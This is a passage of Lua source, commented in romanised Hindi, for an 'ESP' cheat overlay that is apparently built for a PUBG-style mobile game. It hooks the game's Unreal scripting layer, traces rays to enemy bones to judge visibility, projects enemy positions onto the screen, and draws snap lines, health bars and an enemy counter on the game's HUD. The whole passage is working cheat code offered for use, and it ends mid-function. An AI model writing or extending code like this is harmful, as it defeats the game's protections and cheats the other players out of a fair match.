  ESP._camT, ESP._camX, ESP._camY, ESP._camZ = now, x, y, z
  return x, y, z
end

function H.trace(pc, s, e)
  return KismetSystemLibraryESP.LineTraceSingle(pc, s, e, 0, false, nil, 0, CachedHitResult, true)
end
function H.hitActor()
  if CachedHitResult then
    if type(CachedHitResult.GetActor) == "function" then return CachedHitResult:GetActor() end
    return CachedHitResult.Actor
  end
end
ESP._traceEnd = { X = 0, Y = 0, Z = 0 }

-- Kya camera (cx,cy,cz) se bone (bx,by,bz) tak seedha raasta khula hai? (logic purane jaisa)
function ESP.IsBoneVisible(pc, cx, cy, cz, target, bx, by, bz)
  if not KismetSystemLibraryESP or not KismetSystemLibraryESP.LineTraceSingle then return true end
  local dx, dy, dz = bx - cx, by - cy, bz - cz
  local dist = math.sqrt(dx * dx + dy * dy + dz * dz)
  if dist < 50 then return true end
  TraceStartPos.X = cx + (dx / dist) * 60
  TraceStartPos.Y = cy + (dy / dist) * 60
  TraceStartPos.Z = cz + (dz / dist) * 60
  local e = ESP._traceEnd
  e.X, e.Y, e.Z = bx, by, bz
  local ok, bHit = pcall(H.trace, pc, TraceStartPos, e)
  if not ok then return false end
  if bHit then
    local ok2, hitActor = pcall(H.hitActor)
    if ok2 and ESPValid(hitActor) and hitActor == target then return true end
    return false
  end
  return true
end

ESP._bones = { "head", "spine_03", "pelvis" }
ESP.VisBudget = 3          -- ek Update mein zyada se zyada itne targets ka visibility check (spike na bane)
ESP._visLeft = 3

-- Line ka color batane wala check. Natija VisInterval (0.15 s) tak cache. Sab targets ek saath expire hon to ek hi
-- frame mein 8-10 raycast ka spike banta tha: ab ek Update mein VisBudget se zyada nahi, baaki thodi der purana
-- natija (max 0.6 s) dikhate hain aur agle Update mein number aata hai.
function ESP.IsVisible(key, pc, Character, now)
  local cached = ESP.VisCache[key]
  if cached then
    local age = now - (cached.t or 0)
    if age >= 0 and age < (CFG.VisInterval or 0.15) then return cached.b end
    if ESP._visLeft <= 0 and age >= 0 and age < 0.6 then return cached.b end
  end
  ESP._visLeft = ESP._visLeft - 1
  local bVis = false
  local cx, cy, cz = nil, nil, nil
  if pc then cx, cy, cz = ESP.CamXYZ(pc, now) end
  if ESPValid(Character) and ESPValid(pc) and cx ~= nil then
    local bones = ESP._bones
    for i = 1, #bones do
      local bx, by, bz = ESP.GetBoneXYZ(Character, bones[i])
      if bx ~= nil and (bx ~= 0 or by ~= 0 or bz ~= 0) then
        if ESP.IsBoneVisible(pc, cx, cy, cz, Character, bx, by, bz) then bVis = true break end
      end
    end
  else
    bVis = true
  end
  if cached then cached.b, cached.t = bVis, now
  else ESP.VisCache[key] = { b = bVis, t = now } end
  return bVis
end

function ESP.ActorLocation(Character)
  local loc = nil
  if not ESPValid(Character) then return nil end
  pcall(function()
    if Character.K2_GetActorLocation then loc = Character:K2_GetActorLocation()
    elseif Game and Game.GetActorLocation then loc = Game:GetActorLocation(Character) end
  end)
  return loc
end

function ESP.DistMeters(a, b)
  if not a or not b then return math.huge end
  local dx, dy, dz = a.X - b.X, a.Y - b.Y, a.Z - b.Z
  return math.sqrt(dx * dx + dy * dy + dz * dz) / 100.0
end

-- Target ka vertical bounds: (cx, cy, cz, halfHeight) numbers. Capsule component ek baar milta hai aur 2 s cache hota hai
-- (pehle har Update par GetCapsuleComponent + isValid + 3 table allocs); half-height 0.25 s cache (stance rarely badalta).
ESP._locFns, ESP._halfFns = nil, nil
function H.capLoc2(cap) local l = cap:GetComponentLocation(); return l.X, l.Y, l.Z end
function H.capProp(ch) return ch.CapsuleComponent end
function H.capHalf2(cap) return cap:GetUnscaledCapsuleHalfHeight() end
function H.capHalf3(cap) return cap.CapsuleHalfHeight end
function H.gameLoc(ch) local l = Game:GetActorLocation(ch); return l.X, l.Y, l.Z end
function H.crouched(ch) return ch.bIsCrouched end
function H.prone(ch) return ch.IsProne and ch:IsProne() end

function ESP.TargetBounds(ts, c, now)
  local cap = ts.caps
  local dtc = now - (ts.capT or -1e9)
  if cap == nil or dtc < 0 or dtc >= 2.0 then
    cap = nil
    local ok, r = pcall(H.capsule, c)
    if ok and r ~= nil and ESPValid(r) then cap = r
    else
      ok, r = pcall(H.capProp, c)
      if ok and r ~= nil and ESPValid(r) then cap = r end
    end
    ts.caps, ts.capT = cap, now
    ts.half = nil
  end
  local cx, cy, cz, half = nil, nil, nil, nil
  if cap then
    local ok, x, y, z = pcall(H.capLoc, cap)
    if not (ok and x ~= nil) then ok, x, y, z = pcall(H.capLoc2, cap) end
    if ok and x ~= nil then cx, cy, cz = x, y, z end
    local dth = now - (ts.halfT or -1e9)
    if ts.half == nil or dth < 0 or dth >= 0.25 then
      local okh, hv = pcall(H.capHalf, cap)
      if not (okh and type(hv) == "number") then okh, hv = pcall(H.capHalf2, cap) end
      if not (okh and type(hv) == "number") then okh, hv = pcall(H.capHalf3, cap) end
      ts.half = (okh and type(hv) == "number") and hv or false
      ts.halfT = now
    end
    half = ts.half or nil
  end
  if cx == nil then
    local ok, x, y, z = pcall(H.loc, c)
    if ok and x ~= nil then cx, cy, cz = x, y, z
    else
      ok, x, y, z = pcall(H.gameLoc, c)
      if ok and x ~= nil then cx, cy, cz = x, y, z end
    end
  end
  if cx == nil then return nil end
  if not half or half < 10 or half > 200 then
    half = 85
    local okc, cr = pcall(H.crouched, c)
    if okc and cr then half = 60 end
    local okp, pr = pcall(H.prone, c)
    if okp and pr then half = 25 end
  end
  return cx, cy, cz, half
end

function H.now()
  local w = slua.getWorld()
  if w == nil then return nil end
  return GameplayStaticsESP.GetRealTimeSeconds(w)
end

-- WALL-CLOCK (GetRealTimeSeconds). Dhyan: os.clock() CPU-time hai (Android par saare threads ka jod),
-- isliye wo throttle ke liye bharosemand nahi -- gate hamesha is se chalta hai.
function ESP.Now()
  if GameplayStaticsESP and GameplayStaticsESP.GetRealTimeSeconds and slua and slua.getWorld then
    local ok, t = pcall(H.now)
    t = ok and tonumber(t) or nil
    if t then return t end
  end
  local t = nil
  if os and os.clock then t = os.clock() end
  return tonumber(t) or 0.0
end

function ESP.World()
  local w = nil
  if slua and slua.getWorld then
    local ok, r = pcall(slua.getWorld)
    if ok then w = r end
  end
  return w
end

-- ---------- canvas ----------
function ESP.GetCanvas()
  if ESPValid(ESP.Canvas) then return ESP.Canvas end
  local root = nil
  pcall(function()
    local InGameUITools = require("GameLua.Mod.BaseMod.Common.UI.InGameUITools")
    if InGameUITools and InGameUITools.GetMainControlBaseUI then root = InGameUITools.GetMainControlBaseUI() end
  end)
  if not ESPValid(root) then return nil end
  local canvas = nil
  pcall(function()
    if ESPValid(root.CanvasPanel_0) then canvas = root.CanvasPanel_0
    elseif ESPValid(root.CanvasPanel_42) then canvas = root.CanvasPanel_42 end
  end)
  if ESPValid(canvas) then ESP.Canvas = canvas return canvas end
  return nil
end

function ESP.UpdateCanvasTransform(pc)
  local canvas = ESP.GetCanvas()
  if not ESPValid(canvas) then return false end
  local calibrated = false
  pcall(function()
    if SlateBlueprintLibrary and SlateBlueprintLibrary.AbsoluteToLocal then
      local geo = canvas:GetCachedGeometry()
      if geo then
        local p0 = SlateBlueprintLibrary.AbsoluteToLocal(geo, ESPV2(0, 0))
        local p1 = SlateBlueprintLibrary.AbsoluteToLocal(geo, ESPV2(100, 100))
        if p0 and p1 and tonumber(p0.X) and tonumber(p1.X) and p1.X ~= p0.X and p1.Y ~= p0.Y then
          ESP.ScaleX = (p1.X - p0.X) / 100.0
          ESP.ScaleY = (p1.Y - p0.Y) / 100.0
          ESP.OffsetX = p0.X
          ESP.OffsetY = p0.Y
          calibrated = true
        end
      end
    end
  end)
  if not calibrated then
    local scale = 1.0
    pcall(function()
      if WidgetLayoutLibrary and WidgetLayoutLibrary.GetViewportScale then
        local s = WidgetLayoutLibrary.GetViewportScale(pc)
        if tonumber(s) and s > 0 then scale = s end
      end
    end)
    ESP.ScaleX = 1.0 / scale
    ESP.ScaleY = 1.0 / scale
    ESP.OffsetX = 0.0
    ESP.OffsetY = 0.0
  end
  return true
end

function ESP.Viewport(pc)
  local w, h = 1920.0, 1080.0
  pcall(function()
    if pc and pc.GetViewportSize then
      local v = ESPV2(0, 0)
      pc:GetViewportSize(v)
      if v and tonumber(v.X) and v.X > 200 then w, h = v.X, v.Y end
    end
  end)
  return w, h
end

-- Screen projection: plain NUMBERS lautati hai (pehle har call par 2 FVector2D userdata banta tha + ~8 field reads).
-- return: canvasX, canvasY, rawPixelX, rawPixelY   (ya nil agar point camera ke peeche ho)
ESP._pix = nil
ESP._projLoc = { X = 0, Y = 0, Z = 0 }
function ESP.ProjectXY(pc, x, y, z)
  if not pc then return nil end
  local pix = ESP._pix
  if not pix then pix = ESPV2(0, 0) ESP._pix = pix end
  local loc = ESP._projLoc
  loc.X, loc.Y, loc.Z = x, y, z
  if ESP._pixReset then pix.X = 0 pix.Y = 0 end
  local ok, res = pcall(H.proj, pc, loc, pix)
  if not ok then return nil end
  local good = nil
  if res == true or res == 1 then good = true
  elseif res == false or res == 0 then good = false
  else ESP._pixReset = true end         -- engine ne bool nahi diya: purana tareeka (pix != 0,0), pix har baar zero karna padega
  local px, py = pix.X, pix.Y
  if good == nil then good = (px ~= 0 or py ~= 0) end
  if not good then return nil end
  return px * (ESP.ScaleX or 1.0) + (ESP.OffsetX or 0.0), py * (ESP.ScaleY or 1.0) + (ESP.OffsetY or 0.0), px, py
end

-- purane naam ka wrapper (kahin aur use ho to chalta rahe)
function ESP.Project(pc, worldLoc)
  if not pc or not worldLoc then return nil end
  local sx, sy, px, py = ESP.ProjectXY(pc, worldLoc.X, worldLoc.Y, worldLoc.Z)
  if not sx then return nil end
  return ESPV2(sx, sy), ESPV2(px, py)
end

-- [FIX] EXACT screen-center X (canvas coords). Camera ke seedhe aage ek point ko usi
-- ESP.Project mapping se project karte hain jo enemy boxes use karte hain, isliye
-- result crosshair/screen center par hi aata hai (viewport width/scale ki galti se bachta hai).
function H.camRot(pc)
  local mgr = ESP.GetCamMgr(pc)
  if mgr and mgr.GetCameraLocation and mgr.GetCameraRotation then
    local loc, rot = mgr:GetCameraLocation(), mgr:GetCameraRotation()
    if loc and rot then return loc.X, loc.Y, loc.Z, rot.Yaw, rot.Pitch end
  end
end

-- Screen center ek hi baar naapte hain aur 0.5 s cache karte hain (viewport badalta nahi). Pehle har Update par ~20 engine
-- calls + userdata allocs lagte the, jabki natija hamesha wahi aata tha.
function ESP.ScreenCenterX(pc, viewW)
  local now = ESP._now or 0
  local dt = now - (ESP._scxT or -1e9)
  if ESP._scx and dt >= 0 and dt < 0.5 then return ESP._scx end
  ESP._scxT = now
  local cx = nil
  local ok, x0, y0, z0, yawD, pitchD = pcall(H.camRot, pc)
  if ok and x0 ~= nil and yawD ~= nil and pitchD ~= nil then
    local yaw, pitch = math.rad(yawD), math.rad(pitchD)
    local cp = math.cos(pitch)
    local D = 10000
    local sx = ESP.ProjectXY(pc, x0 + cp * math.cos(yaw) * D, y0 + cp * math.sin(yaw) * D, z0 + math.sin(pitch) * D)
    if sx and tonumber(sx) then cx = sx end
  end
  if not cx then
    local vw2 = tonumber(viewW) or select(1, ESP.Viewport(pc))
    cx = (vw2 * 0.5) * (ESP.ScaleX or 1.0) + (ESP.OffsetX or 0.0)
  end
  -- hysteresis: 2px se chhota farq ignore (jitter/blink nahi)
  if ESP._scx and math.abs(cx - ESP._scx) < 2.0 then cx = ESP._scx else ESP._scx = cx end
  return cx
end

function ESP.SnapOrigin(pc, viewW)
  return ESPV2(RND(ESP.ScreenCenterX(pc, viewW)), (CFG.SnapOriginY or 0.0))
end

-- ---------- widget helpers (Help patterns) ----------
function ESP.SetFont(w, size)
  if not ESPValid(w) then return end
  pcall(function()
    local f = w.Font
    if f then
      f.Size = size
      if f.OutlineSettings then
        pcall(function() f.OutlineSettings.OutlineSize = 1 end)
        pcall(function() f.OutlineSettings.OutlineColor = C_BLACK end)
      end
      w:SetFont(f)
    end
    if w.SetShadowOffset then w:SetShadowOffset(ESPV2(1.0, 1.0)) end
    if w.SetShadowColorAndOpacity then w:SetShadowColorAndOpacity(C_BLACK) end
  end)
end

function ESP.SetTextColor(w, color)
  if not ESPValid(w) then return end
  pcall(function()
    if SlateColor then w:SetColorAndOpacity(SlateColor(color))
    else w:SetColorAndOpacity(color) end
  end)
end

function ESP.NewLine(color, z)
  local canvas = ESP.GetCanvas()
  if not ESPValid(canvas) then return nil end
  local border = nil
  pcall(function() border = CGame:NewObjectFromPath("/Script/UMG.Border", canvas) end)
  if not ESPValid(border) then return nil end
  pcall(function()
    border:SetBrushColor(color)
    border:SetWidgetVisibility(UEnums.ESlateVisibility.SelfHitTestInvisible)
    border:SetRenderTransformPivot(ESPV2(0.0, 0.5))
  end)
  local slot = nil
  pcall(function() slot = canvas:AddChildToCanvas(border) end)
  if not slot then
    pcall(function() border:RemoveFromParent() end)
    return nil
  end
  pcall(function() slot:SetAutoSize(false) slot:SetZOrder(z or 30) end)
  return { Widget = border, Slot = slot }
end

-- Line ke widget par sirf wahi cheez likhte hain jo asal mein badli (position / size / angle / visibility).
-- Snap line ka start (origin) kabhi nahi badalta, isliye chalti line par pehle jo 4 engine calls lagti thin
-- (SetPosition, SetSize, SetRenderAngle, SetWidgetVisibility) ab sirf 2 lagti hain (SetSize + SetRenderAngle).
function H.lineApply(d, px, py, len, th, angle)
  if d.hidden == true then
    d.Widget:SetWidgetVisibility(UEnums.ESlateVisibility.SelfHitTestInvisible)
    d.hidden = false
  end
  if d.ppx ~= px or d.ppy ~= py then
    d.Slot:SetPosition(ESPV2(px, py))
    d.ppx, d.ppy = px, py
  end
  if d.pl ~= len or d.pth ~= th then
    d.Slot:SetSize(ESPV2(len, th))
    d.pl, d.pth = len, th
  end
  if d.pa ~= angle then
    d.Widget:SetRenderAngle(angle)
    d.pa = angle
  end
end

function ESP.DrawLine(data, x1, y1, x2, y2, thickness)
  if not data or not data.Slot or not ESP.WOk(data) then return false end
  if x1 ~= x1 or y1 ~= y1 or x2 ~= x2 or y2 ~= y2 then return false end
  local R = RND
  if data.fine then R = function(v) return math.floor(v * 4 + 0.5) / 4 end end
  x1, y1, x2, y2 = R(x1), R(y1), R(x2), R(y2)
  local dz = CFG.DeadZone or 0.5
  if data.lx1 and data.th == thickness then
    if math.abs((data.lx1 or 0) - x1) < dz and math.abs((data.ly1 or 0) - y1) < dz
    and math.abs((data.lx2 or 0) - x2) < dz and math.abs((data.ly2 or 0) - y2) < dz then
      if data.hidden ~= true then return true end
    end
  end
  local dx, dy = x2 - x1, y2 - y1
  local len = math.sqrt(dx * dx + dy * dy)
  if len < 1 then
    ESP.Hide(data)
    return false
  end
  local angle = ((math.atan2 and math.atan2(dy, dx)) or math.atan(dy, dx)) * 180.0 / math.pi
  angle = math.floor(angle * 10 + 0.5) / 10
  len = R(len)
  if data.lx1 == x1 and data.ly1 == y1 and data.lx2 == x2 and data.ly2 == y2 and data.th == thickness then
    if data.hidden == true then
      pcall(H.vis, data.Widget, UEnums.ESlateVisibility.SelfHitTestInvisible)
      data.hidden = false
    end
    return true
  end
  local ok = pcall(H.lineApply, data, x1, y1 - thickness * 0.5, len, thickness, angle)
  if ok then
    data.lx1, data.ly1, data.lx2, data.ly2, data.th = x1, y1, x2, y2, thickness
    data.hidden = false
  end
  return true
end

function ESP.DrawVBar(data, x, top, h, thickness)
  -- vertical health bar: no angle math, seedha Position+Size (double-draw fix)
  if not data or not data.Slot or not ESP.WOk(data) then return false end
  if h ~= h or h < 1 then ESP.Hide(data) return false end
  x, top, h = RND(x), RND(top), RND(h)
  local dz = CFG.DeadZone or 0.5
  if data.bx ~= nil then
    if math.abs(data.bx - x) < dz and math.abs(data.bt - top) < dz and math.abs(data.bh - h) < dz then
      if data.hidden ~= true then return true end
    end
  end
  if data.bx == x and data.bt == top and data.bh == h then
    if data.hidden == true then
      pcall(H.vis, data.Widget, UEnums.ESlateVisibility.SelfHitTestInvisible)
      data.hidden = false
    end
    return true
  end
  local ok = pcall(H.barApply, data, x, top, thickness, h)
  if ok then data.bx, data.bt, data.bh = x, top, h data.hidden = false end
  return true
end

-- Bar (health): position / size / angle(0) / visibility -- sirf jo badla wahi engine ko jata hai.
function H.barApply(d, x, top, w, h)
  if d.hidden == true then
    d.Widget:SetWidgetVisibility(UEnums.ESlateVisibility.SelfHitTestInvisible)
    d.hidden = false
  end
  if d.ppx ~= x or d.ppy ~= top then
    d.Slot:SetPosition(ESPV2(x, top))
    d.ppx, d.ppy = x, top
  end
  if d.pl ~= w or d.pth ~= h then
    d.Slot:SetSize(ESPV2(w, h))
    d.pl, d.pth = w, h
  end
  if d.pa ~= 0 then
    d.Widget:SetRenderAngle(0)
    d.pa = 0
  end
end

function ESP.DrawHBar(data, x, top, w, h)
  -- horizontal bar: SetPosition + SetSize directly, no angle
  if not data or not data.Slot or not ESP.WOk(data) then return false end
  if w ~= w or w < 1 or h ~= h or h < 1 then ESP.Hide(data) return false end
  x, top, w, h = RND(x), RND(top), RND(w), RND(h)
  local dz = CFG.DeadZone or 0.5
  if data.bx ~= nil then
    if math.abs(data.bx - x) < dz and math.abs(data.bt - top) < dz
    and math.abs(data.bh - h) < dz and math.abs((data.bw or 0) - w) < dz then
      if data.hidden ~= true then return true end
    end
  end
  local ok = pcall(H.barApply, data, x, top, w, h)
  if ok then data.bx, data.bt, data.bh, data.bw = x, top, h, w data.hidden = false end
  return true
end

function ESP.Hide(data)
  -- pehle sasti Lua check (already hidden?), phir hi engine ka isValid -- pehle ulta tha:
  -- har Hide() par (chhupe hue widget par bhi) ek faltu engine call hoti thi.
  if data and data.hidden ~= true and ESP.WOk(data) then
    pcall(H.vis, data.Widget, UEnums.ESlateVisibility.Collapsed)
    data.hidden = true
    data.lx1, data.ly1, data.lx2, data.ly2, data.th = nil, nil, nil, nil, nil
    data.bx, data.bt, data.bh = nil, nil, nil
  end
end

function ESP.SetBrush(data, color, colorKey)
  if not data then return end
  if colorKey and data.colorKey == colorKey then return end     -- pehle sasta compare
  if not ESP.WOk(data) then return end
  pcall(H.brush, data.Widget, color)
  if colorKey then data.colorKey = colorKey end
end

function ESP.Destroy(data)
  if not data then return end
  local w = data.Widget or data.Container
  if ESPValid(w) then
    pcall(function() w:RemoveFromParent() end)
    pcall(function() w:ConditionalBeginDestroy() end)
  end
end

-- ==============================================================================
-- ENEMY COUNTER V2 -- AKMOD PUBG STYLE  (reference screenshot se pixel-by-pixel trace)
--   [RED half: soldier(slash) icon | count]   [GREEN half: robot icon | 0m]
--   * EK joined bar: dono halves ke beech gap nahi, sirf BAHAR ke 2 corners round
--   * Gradient (reference ke pixels se fit):
--         RED   = bahar bright  -> beech dark
--         GREEN = beech dark    -> bahar bright
--   * Colors LINEAR space mein hain. ESPMKC linear leta hai -- pehle sRGB jaise
--     numbers (0.85, 0.10, 0.10) diye the, isliye game mein pastel/washed-out dikhta tha.
--   * Size compass ke heading-number ke hisaab se compact, compass ke NEECHE.
--   * Sab kuch ESP.TILE_H se scale hota hai (sirf ek number badlo = poora chhota/bada).
--   * Icons reference image se trace kiye hue cells hain (white, alpha shades).
-- ==============================================================================

-- TILE CONFIG
ESP.TILE_H        = 22      -- bar ki height (canvas units)   [pehle 55 tha = bahut bada]
ESP.TILE_TOPY     = 47      -- screen top se Y: compass ke heading number ke neeche
ESP.TILE_HALF_F   = 2.147   -- har half ki width = TILE_H * 2.147   (reference 919x214 px)
ESP.TILE_CORNER_F = 0.187   -- bahar ke corner ka radius = TILE_H * 0.187
ESP.TILE_SLICE_W  = 1.8     -- gradient slice ki chaudai (units): chhota = smooth, zyada widgets
ESP.TILE_DESIGN_PPU = 1.6875 -- icons is device-pixel grid par bane hain (1080p: 1 unit = 1.6875 px)

-- Gradient endpoints -- LINEAR rgb (sRGB equivalent comment mein)
ESP.TILE_RED_OUT = { 0.7656, 0.0606, 0.0583 }   -- ~sRGB (227, 70, 68)  red half ka bahar wala kinara
ESP.TILE_RED_IN  = { 0.1490, 0.0276, 0.0164 }   -- ~sRGB (108, 46, 34)  red half ka beech wala kinara
ESP.TILE_GRN_IN  = { 0.0120, 0.1691, 0.0341 }   -- ~sRGB ( 29,114, 52)  green half ka beech wala kinara
ESP.TILE_GRN_OUT = { 0.0401, 0.7077, 0.1412 }   -- ~sRGB ( 56,219,105)  green half ka bahar wala kinara
local TILE_WHITE = ESPMKC(1.0, 1.0, 1.0, 1.0)             -- text color

-- Text anchors (half ki width ka hissa, reference se naapa)
ESP.TILE_TXT_RED_X = 0.728    -- red count ka center
ESP.TILE_TXT_GRN_X = 0.659    -- green "0m" ka center

-- Icon "layers": layer 1 = poora shape (halka), layer 2 = andar ka hissa, layer 3 = pakka white.
-- Teeno upar-neeche rakhne se coverage 1/3, 2/3, 1.0 banti hai (anti-aliased look, kam widgets).
ESP.TILE_ICON_ALPHA = { 0.3333, 0.5, 1.0 }

-- ICON CELLS: {x1, y1, x2, y2, layer}   1 cell = 1 device pixel (1080p par), TILE_H/22 se scale hota hai.
-- (ox, oy) = grid ka top-left, half-tile ke top-left se, cells mein. Reference image se trace kiya.
ESP.ICON_SOLDIER = { nx = 27, ny = 27, ox = 7, oy = 5, r = {
    {9,0,15,1,1}, {7,1,16,2,1}, {6,2,18,3,1}, {5,3,18,4,1}, {5,4,19,7,1}, {23,5,26,7,1},
    {22,7,26,8,1}, {21,8,25,9,1}, {20,9,24,10,1}, {6,7,18,11,1}, {19,10,24,11,1}, {7,11,17,12,1},
    {7,12,16,13,1}, {18,11,23,13,1}, {8,13,16,14,1}, {18,13,22,14,1}, {6,14,11,15,1}, {14,14,18,15,1},
    {19,14,21,15,1}, {2,15,4,16,1}, {6,15,10,16,1}, {13,15,17,16,1}, {20,15,22,16,1}, {1,16,17,17,1},
    {19,16,22,17,1}, {1,17,16,18,1}, {19,17,23,18,1}, {1,18,15,19,1}, {16,18,23,19,1}, {1,19,23,25,1},
    {1,25,10,26,1}, {11,25,23,26,1}, {2,26,4,27,1}, {13,26,17,27,1}, {20,26,21,27,1}, {9,1,15,2,2},
    {7,2,16,3,2}, {6,3,17,4,2}, {6,4,18,6,2}, {6,6,17,7,2}, {24,6,25,7,2}, {23,7,24,8,2},
    {7,8,16,9,2}, {22,8,24,9,2}, {7,9,17,10,2}, {21,9,23,10,2}, {7,10,16,11,2}, {20,10,23,11,2},
    {8,11,16,12,2}, {20,11,22,12,2}, {9,12,15,13,2}, {19,12,22,13,2}, {7,15,9,16,2}, {15,15,16,16,2},
    {2,16,4,17,2}, {6,16,10,17,2}, {14,16,16,17,2}, {20,16,21,17,2}, {6,17,15,18,2}, {20,17,22,18,2},
    {1,17,4,19,2}, {6,18,14,19,2}, {1,19,5,20,2}, {6,19,13,20,2}, {1,20,13,21,2}, {15,20,17,21,2},
    {1,21,12,22,2}, {14,21,18,22,2}, {1,22,11,23,2}, {1,23,10,24,2}, {13,22,18,24,2}, {1,24,9,25,2},
    {12,24,18,25,2}, {2,25,4,26,2}, {12,25,17,26,2}, {19,18,22,26,2}, {9,2,15,3,3}, {8,3,16,4,3},
    {7,4,17,6,3}, {9,9,15,11,3}, {9,11,14,12,3}, {8,17,10,18,3}, {2,18,3,19,3}, {8,18,13,19,3},
    {8,19,12,21,3}, {8,21,11,22,3}, {8,22,10,23,3}, {15,22,16,23,3}, {8,23,9,24,3}, {2,19,4,25,3},
    {14,23,16,25,3}, {20,19,21,25,3},
  } }

ESP.ICON_ROBOT = { nx = 22, ny = 30, ox = 8, oy = 4, r = {
    {13,1,15,3,1}, {7,1,9,4,1}, {13,3,14,4,1}, {7,4,10,5,1}, {12,4,13,5,1}, {7,5,14,6,1},
    {7,6,15,7,1}, {5,7,16,8,1}, {4,8,17,9,1}, {4,9,18,10,1}, {3,10,19,11,1}, {2,11,20,16,1},
    {3,16,19,17,1}, {4,17,18,18,1}, {5,18,17,19,1}, {6,19,16,20,1}, {6,20,17,21,1}, {1,21,20,22,1},
    {1,22,21,29,1}, {8,6,13,7,2}, {7,7,15,8,2}, {6,8,16,9,2}, {5,9,16,10,2}, {4,10,6,11,2},
    {7,10,17,11,2}, {7,11,12,12,2}, {13,11,15,12,2}, {16,11,19,12,2}, {3,11,6,13,2}, {8,12,19,13,2},
    {3,13,19,15,2}, {3,15,8,16,2}, {13,15,19,16,2}, {4,16,18,17,2}, {5,17,17,18,2}, {6,18,16,19,2},
    {7,19,15,21,2}, {5,21,17,22,2}, {2,22,20,23,2}, {1,23,20,24,2}, {1,24,21,27,2}, {1,27,20,28,2},
    {8,7,13,8,3}, {7,8,13,9,3}, {9,9,12,10,3}, {10,10,11,11,3}, {4,12,5,13,3}, {17,12,18,13,3},
    {4,13,6,14,3}, {10,13,11,14,3}, {16,13,18,14,3}, {15,14,18,15,3}, {4,14,7,16,3}, {15,15,17,16,3},
    {5,16,7,17,3}, {15,16,16,17,3}, {6,17,15,18,3}, {7,18,14,19,3}, {8,19,14,21,3}, {7,21,14,22,3},
    {5,22,17,23,3}, {2,23,19,24,3}, {2,24,20,27,3}, {5,27,11,28,3}, {12,27,18,28,3},
  } }


-- Tile ke dono text widgets zinda hain? (0.5 s cache -- pehle har Update par 2 isValid)
function ESP.RibbonOk(rb)
  local now = ESP._now or 0
  local dt = now - (rb.vt or -1e9)
  if rb.ve == ESP._vep and dt >= 0 and dt < ESP.WCheckEvery then return rb.vok end
  local ok = ESPValid(rb.TxtPlayer) and ESPValid(rb.TxtBot)
  rb.ve, rb.vt, rb.vok = ESP._vep, now, ok
  return ok
end

function ESP.RibbonDestroy()
  local rb = ESP.Ribbon
  ESP.Ribbon = nil
  if not rb then return end
  -- destroy all parts
  if rb.Parts then
    for _, parts in pairs(rb.Parts) do
      for _, p in ipairs(parts) do
        if p.ln then ESP.Destroy(p.ln) end
      end
    end
  end
  -- destroy text blocks
  for _, k in ipairs({ "TxtPlayer", "TxtBot" }) do
    if rb[k] then ESP.Destroy({ Widget = rb[k] }) end
  end
end

function ESP.RibbonHide()
  local rb = ESP.Ribbon
  if not rb or rb.hidden then return end
  rb.hidden = true
  local col = UEnums.ESlateVisibility.Collapsed
  if rb.Parts then
    for _, parts in pairs(rb.Parts) do
      for _, p in ipairs(parts) do
        if p.ln then ESP.Hide(p.ln) end
      end
    end
  end
  for _, k in ipairs({ "TxtPlayer", "TxtBot" }) do
    local w = rb[k]
    if ESPValid(w) then pcall(function() w:SetWidgetVisibility(col) end) end
  end
end

-- Device pixels per canvas unit (ESP.ScaleX = canvas units per pixel). Fallback: 1080p ka 1.6875.
function ESP.GetPPU()
  local sx = tonumber(ESP.ScaleX)
  if sx and sx > 0 then
    local p = 1.0 / sx
    if p >= 0.8 and p <= 4.0 then return p end
  end
  return ESP.TILE_DESIGN_PPU or 1.6875
end

-- Rect (x1,y1)-(x2,y2) ko DEVICE PIXEL grid par snap karke lagata hai, koi rotation nahi.
-- Gradient slices aur icon cells ke liye: edges poore pixel par girti hain => na seam, na blur.
-- (DrawHBar poore unit par round karta hai = chhote cells gayab ho jate.)
function ESP.DrawRectF(data, x1, y1, x2, y2)
  if not data or not data.Slot or not ESP.WOk(data) then return false end
  if x1 ~= x1 or y1 ~= y1 or x2 ~= x2 or y2 ~= y2 then return false end
  local ppu = ESP.GetPPU()
  x1 = math.floor(x1 * ppu + 0.5) / ppu
  y1 = math.floor(y1 * ppu + 0.5) / ppu
  x2 = math.floor(x2 * ppu + 0.5) / ppu
  y2 = math.floor(y2 * ppu + 0.5) / ppu
  local w, h = x2 - x1, y2 - y1
  local minSz = 0.5 / ppu
  if w < minSz or h < minSz then
    ESP.Hide(data)
    return false
  end
  if data.fx1 == x1 and data.fy1 == y1 and data.fx2 == x2 and data.fy2 == y2
     and data.hidden ~= true then
    return true
  end
  local ok = pcall(function()
    data.Slot:SetPosition(ESPV2(x1, y1))
    data.Slot:SetSize(ESPV2(w, h))
    data.Widget:SetRenderAngle(0)
    data.Widget:SetWidgetVisibility(UEnums.ESlateVisibility.SelfHitTestInvisible)
  end)
  if ok then
    data.fx1, data.fy1, data.fx2, data.fy2 = x1, y1, x2, y2
    data.hidden = false
  end
  return true
end

-- Tile ka text: game ka apna HUD font (reference jaisa squarish), sirf size set,
-- outline/shadow BAND (reference mein digits bilkul clean white hain).
function ESP.SetTileFont(w, size)
  if not ESPValid(w) then return end
  pcall(function()
    local f = w.Font
    if not f then return end
    f.Size = size
    pcall(function()
      local o = f.OutlineSettings          -- copy
      if o then
        o.OutlineSize = 0
        pcall(function() o.OutlineColor = ESPMKC(0, 0, 0, 0) end)
        f.OutlineSettings = o              -- wapas assign (SetLabelFont wala tareeqa)
      end
    end)
    w:SetFont(f)
  end)
  pcall(function()
    if w.SetShadowOffset then w:SetShadowOffset(ESPV2(0, 0)) end
    if w.SetShadowColorAndOpacity then w:SetShadowColorAndOpacity(ESPMKC(0, 0, 0, 0)) end
  end)
end

-- Digit ki height = bar ki aadhi (reference: 107px / 214px). Game ke HUD font mein
-- digit height ~= 0.986 * font size (isi game screenshot se measure kiya).
function ESP.TileFontSize()
  return math.max(6, math.floor(ESP.TILE_H * 0.5 / 0.986 + 0.5))
end

function ESP.TileColor(a, b, t)
  return ESPMKC(a[1] + (b[1] - a[1]) * t,
                a[2] + (b[2] - a[2]) * t,
                a[3] + (b[3] - a[3]) * t, 1.0)
end

-- Ek half ko vertical slices mein todta hai. d = BAHAR ki edge se doori.
-- Pehle corner ke slices (har pixel-column ek slice, circle ke hisaab se upar-neeche se kata hua),
-- baaki barabar chaudai ke (gradient).
function ESP.TileBounds(halfW, R)
  local out = {}
  local ppu = ESP.TILE_DESIGN_PPU or 1.6875
  local nc = math.max(3, math.ceil(R * ppu - 0.01))
  local prevD = 0.0
  for k = 1, nc do
    local d1 = R * k / nc
